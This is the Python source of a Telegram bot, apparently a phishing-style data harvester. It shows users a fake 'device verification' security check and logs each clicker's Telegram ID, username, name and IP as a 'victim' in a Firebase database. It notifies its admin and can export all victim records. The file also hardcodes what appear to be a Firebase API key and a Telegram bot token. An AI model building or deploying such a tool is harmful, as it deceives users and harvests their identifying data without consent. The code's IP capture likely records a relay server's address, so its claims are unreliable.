# =============================================
# 🤖 TELEGRAM BOT – Firebase + Vercel Version
# =============================================
# Made by Bu SovitX 🔥
# Database: Firebase Realtime Database
# Host: Vercel
# =============================================

import json
import os
import time
import requests
from datetime import datetime
import firebase_admin
from firebase_admin import credentials, db

# =============================================
# 🔥 FIREBASE CONFIG
# =============================================

# Firebase config from your provided data
FIREBASE_CONFIG = {
    "apiKey": "AIzaSyDrCeKnBujSGLdUXDTLdR0WftXXv6PU7vA",
    "authDomain": "mines-game-2f39b.firebaseapp.com",
    "databaseURL": "https://mines-game-2f39b-default-rtdb.firebaseio.com",
    "projectId": "mines-game-2f39b",
    "storageBucket": "mines-game-2f39b.firebasestorage.app",
    "messagingSenderId": "474228392974",
    "appId": "1:474228392974:web:ee6e646692f40dd01de85f",
    "measurementId": "G-5PS1C7C5Y9"
}

# Initialize Firebase (using service account or environment variables)
def init_firebase():
    """Initialize Firebase Admin SDK"""
    try:
        # Method 1: Service Account JSON (Recommended for Vercel)
        if os.path.exists('firebase/serviceAccountKey.json'):
            cred = credentials.Certificate('firebase/serviceAccountKey.json')
            firebase_admin.initialize_app(cred, {
                'databaseURL': FIREBASE_CONFIG['databaseURL']
            })
        else:
            # Method 2: Environment variables (Vercel)
            firebase_admin.initialize_app(options={
                'databaseURL': FIREBASE_CONFIG['databaseURL']
            })
        print("✅ Firebase initialized successfully")
        return True
    except Exception as e:
        print(f"❌ Firebase init error: {e}")
        # Method 3: Fallback to REST API (no SDK)
        return False

# Try to initialize
FIREBASE_INITIALIZED = init_firebase()

# =============================================
# 📦 FIREBASE DATABASE FUNCTIONS
# =============================================

def save_to_firebase(user_id, username, first_name, ip, data):
    """Save victim data to Firebase"""
    try:
        if FIREBASE_INITIALIZED:
            # Using Firebase Admin SDK
            ref = db.reference('/victims')
            new_ref = ref.push()
            new_ref.set({
                'user_id': str(user_id),
                'username': username or 'No Username',
                'first_name': first_name or 'Unknown',
                'ip': ip,
                'data': data,
                'timestamp': datetime.now().isoformat()
            })
            print(f"✅ Data saved to Firebase: {new_ref.key}")
            return True
        else:
            # Fallback: REST API
            return save_to_firebase_rest(user_id, username, first_name, ip, data)
    except Exception as e:
        print(f"❌ Firebase save error: {e}")
        # Fallback to REST
        return save_to_firebase_rest(user_id, username, first_name, ip, data)

def save_to_firebase_rest(user_id, username, first_name, ip, data):
    """Save to Firebase using REST API (fallback)"""
    try:
        # Firebase REST API
        url = f"{FIREBASE_CONFIG['databaseURL']}/victims.json"
        payload = {
            'user_id': str(user_id),
            'username': username or 'No Username',
            'first_name': first_name or 'Unknown',
            'ip': ip,
            'data': data,
            'timestamp': datetime.now().isoformat()
        }
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print("✅ Data saved via REST")
            return True
        else:
            print(f"❌ REST save failed: {response.text}")
            return False
    except Exception as e:
        print(f"❌ REST error: {e}")
        return False

def get_all_victims_firebase():
    """Get all victims from Firebase"""
    try:
        if FIREBASE_INITIALIZED:
            ref = db.reference('/victims')
            data = ref.get()
            if data:
                return data
            return {}
        else:
            # REST API fallback
            url = f"{FIREBASE_CONFIG['databaseURL']}/victims.json"
            response = requests.get(url)
            if response.status_code == 200:
                return response.json()
            return {}
    except Exception as e:
        print(f"❌ Firebase get error: {e}")
        return {}

def get_victims_count():
    """Get total victims count"""
    try:
        if FIREBASE_INITIALIZED:
            ref = db.reference('/victims')
            data = ref.get()
            return len(data) if data else 0
        else:
            url = f"{FIREBASE_CONFIG['databaseURL']}/victims.json?shallow=true"
            response = requests.get(url)
            if response.status_code == 200:
                data = response.json()
                return len(data) if data else 0
            return 0
    except Exception as e:
        print(f"❌ Count error: {e}")
        return 0

def get_latest_victims(limit=5):
    """Get latest N victims"""
    try:
        if FIREBASE_INITIALIZED:
            ref = db.reference('/victims')
            # Get all, then sort (Firebase doesn't support order by timestamp in Admin SDK easily)
            data = ref.get()
            if not data:
                return []
            # Convert to list and sort by timestamp
            victims = []
            for key, value in data.items():
                victims.append({**value, 'key': key})
            victims.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
            return victims[:limit]
        else:
            # REST API with ordering
            url = f"{FIREBASE_CONFIG['databaseURL']}/victims.json?orderBy=\"timestamp\"&limitToLast={limit}"
            response = requests.get(url)
            if response.status_code == 200:
                data = response.json()
                if data:
                    victims = []
                    for key, value in data.items():
                        victims.append({**value, 'key': key})
                    return victims[::-1]
            return []
    except Exception as e:
        print(f"❌ Get latest error: {e}")
        return []

# =============================================
# 🤖 TELEGRAM BOT FUNCTIONS
# =============================================

BOT_TOKEN = os.environ.get('BOT_TOKEN') or "8994349885:AAHHDvskvoL6-pdYxJmmq9UsI-FWTN-zYMU"
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID') or "YOUR_TELEGRAM_ID"  # 🔥 REPLACE WITH YOUR ID
WEBHOOK_SECRET = os.environ.get('WEBHOOK_SECRET') or "sovitx_secret_2026"

def send_telegram_message(chat_id, text, reply_markup=None):
    """Send message via Telegram Bot API"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'Markdown'
    }
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Error sending message: {e}")
        return None

def edit_telegram_message(chat_id, message_id, text):
    """Edit existing message"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    payload = {
        'chat_id': chat_id,
        'message_id': message_id,
        'text': text,
        'parse_mode': 'Markdown'
    }
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Error editing message: {e}")
        return None

def answer_callback(callback_id, text):
    """Answer callback query"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    payload = {
        'callback_query_id': callback_id,
        'text': text
    }
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Error answering callback: {e}")
        return None

# =============================================
# 🎯 COMMAND HANDLERS
# =============================================

def handle_start(chat_id, user_id, username, first_name):
    """Handle /start command"""
    text = f"""
⚡ *Bu SovitX Data Receiver*
━━━━━━━━━━━━━━━━━━━━━

👋 Hello {first_name or username}!

Send `/grab` to start data collection.

🔐 *Your Data is Safe*
📱 *Device Verification Required*

━━━━━━━━━━━━━━━━━━━━━
🔥 *Modded By Bu SovitX*
    """
    send_telegram_message(chat_id, text)

def handle_grab(chat_id):
    """Handle /grab command - Show verification buttons"""
    keyboard = {
        'inline_keyboard': [
            [
                {'text': '📱 Verify Device', 'callback_data': 'verify_device'},
                {'text': '📸 Send Data', 'callback_data': 'send_data'}
            ],
            [
                {'text': '📍 Share Location', 'callback_data': 'share_location'},
                {'text': '📁 My Data', 'callback_data': 'my_data'}
            ]
        ]
    }
    
    text = """
🔐 *Device Verification Required!*

Click the button below to verify your device and send data.

⚠️ *This is a security check.*
✅ *One-time verification only.*

━━━━━━━━━━━━━━━━━━━━━
🔥 *Modded By Bu SovitX*
    """
    send_telegram_message(chat_id, text, keyboard)

def handle_callback(callback_id, chat_id, message_id, user_id, username, first_name, data_type, ip):
    """Handle callback from inline keyboard"""
    
    # Victim data to save
    victim_data = {
        'action': data_type,
        'timestamp': datetime.now().isoformat(),
        'user_id': str(user_id),
        'username': username or 'No Username',
        'first_name': first_name or 'Unknown',
        'ip': ip
    }
    
    # Save to Firebase
    save_result = save_to_firebase(
        user_id=user_id,
        username=username,
        first_name=first_name,
        ip=ip,
        data=victim_data
    )
    
    # Send confirmation
    answer_callback(callback_id, "✅ Data Received! Device Verified!")
    
    # Edit original message
    new_text = f"""
✅ *Verification Complete!*

Your device has been verified successfully.
Data has been collected.

📱 *Device:* Telegram User
👤 *User ID:* `{user_id}`
🔐 *Status:* Verified

💾 *Database:* Firebase ✅

━━━━━━━━━━━━━━━━━━━━━
🔥 *Modded By Bu SovitX*
    """
    edit_telegram_message(chat_id, message_id, new_text)
    
    # Notify admin
    admin_text = f"""
🔔 *New Victim Data!*

👤 *User:* @{username or 'No Username'}
🆔 *ID:* `{user_id}`
📊 *Action:* {data_type}
🌐 *IP:* {ip}
🕐 *Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

────────────────────
📱 *Data Saved to Firebase*
    """
    send_telegram_message(ADMIN_CHAT_ID, admin_text)

def handle_stats(chat_id):
    """Handle /stats command (Admin only)"""
    total = get_victims_count()
    latest = get_latest_victims(5)
    
    text = f"""
📊 *Victim Statistics*
━━━━━━━━━━━━━━━━━━━━━

📱 *Total Victims:* {total}

🕐 *Latest Victims:*
"""
    for victim in latest:
        username = victim.get('username', 'Unknown')
        timestamp = victim.get('timestamp', 'Unknown time')
        text += f"\n• @{username} – {timestamp[:19]}"
    
    if total == 0:
        text += "\n\n⚠️ *No victims yet!*"
    
    text += f"""

💾 *Database:* Firebase Realtime
🌐 *Host:* Vercel

━━━━━━━━━━━━━━━━━━━━━
🔥 *Modded By Bu SovitX*
    """
    send_telegram_message(chat_id, text)

def handle_export(chat_id):
    """Export all data as JSON"""
    all_data = get_all_victims_firebase()
    if all_data:
        # Create JSON file content
        json_data = json.dumps(all_data, indent=2)
        # Send as file
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        payload = {
            'chat_id': chat_id,
            'caption': '📊 *Complete Victim Data Export*\n\nAll data from Firebase',
            'parse_mode': 'Markdown'
        }
        files = {
            'document': ('victims_data.json', json_data, 'application/json')
        }
        try:
            response = requests.post(url, data=payload, files=files)
            return response.json()
        except Exception as e:
            send_telegram_message(chat_id, f"❌ Export error: {e}")
    else:
        send_telegram_message(chat_id, "⚠️ No data to export!")

# =============================================
# 🌐 MAIN WEBHOOK HANDLER
# =============================================

def handler(request):
    """Vercel Serverless Function handler"""
    
    # Get IP
    ip = request.headers.get('x-forwarded-for', 'Unknown').split(',')[0]
    
    # Handle GET requests
    if request.method == 'GET':
        # Health check
        return {
            'statusCode': 200,
            'body': '✅ Bu SovitX Bot is running on Firebase!'
        }
    
    # Handle POST requests
    if request.method == 'POST':
        # Parse Telegram update
        try:
            update = request.json
        except:
            return {
                'statusCode': 400,
                'body': 'Invalid JSON'
            }
        
        # ─── Process Message ───
        if 'message' in update:
            message = update['message']
            chat_id = message['chat']['id']
            user_id = message['from']['id']
            username = message['from'].get('username', 'No Username')
            first_name = message['from'].get('first_name', 'Unknown')
            text = message.get('text', '')
            
            # Handle commands
            if text == '/start':
                handle_start(chat_id, user_id, username, first_name)
            elif text == '/grab':
                handle_grab(chat_id)
            elif text == '/stats':
                if str(user_id) == ADMIN_CHAT_ID:
                    handle_stats(chat_id)
                else:
                    send_telegram_message(chat_id, "⚠️ You are not authorized to use this command!")
            elif text == '/export':
                if str(user_id) == ADMIN_CHAT_ID:
                    handle_export(chat_id)
                else:
                    send_telegram_message(chat_id, "⚠️ You are not authorized to use this command!")
            elif text == '/admin':
                if str(user_id) == ADMIN_CHAT_ID:
                    admin_text = """
🔐 *Admin Panel*

📊 `/stats` - View statistics
📤 `/export` - Export all data
🔍 `/logs` - View logs
ℹ️ `/info` - Bot info

━━━━━━━━━━━━━━━━━━━━━
💾 *Firebase:* Active
🟢 *Status:* Running
    """
                    send_telegram_message(chat_id, admin_text)
                else:
                    send_telegram_message(chat_id, "⚠️ Access Denied!")
            elif text == '/info':
                info_text = f"""
ℹ️ *Bot Information*

🤖 *Name:* Bu SovitX Data Receiver
🔥 *Developer:* @BIBXMOD
💾 *Database:* Firebase Realtime
🌐 *Host:* Vercel
📅 *Version:* 2.0

━━━━━━━━━━━━━━━━━━━━━
💀 *Hack The Planet!*
                """
                send_telegram_message(chat_id, info_text)
            else:
                # Unknown command
                send_telegram_message(chat_id, "⚠️ Unknown command.\n\nSend /grab to start.\nSend /help for commands.")
        
        # ─── Process Callback Query ───
        elif 'callback_query' in update:
            callback = update['callback_query']
            callback_id = callback['id']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            user_id = callback['from']['id']
            username = callback['from'].get('username', 'No Username')
            first_name = callback['from'].get('first_name', 'Unknown')
            data = callback['data']
            
            handle_callback(callback_id, chat_id, message_id, user_id, username, first_name, data, ip)
        
        return {
            'statusCode': 200,
            'body': 'OK'
        }
    
    return {
        'statusCode': 405,
        'body': 'Method Not Allowed'
    }
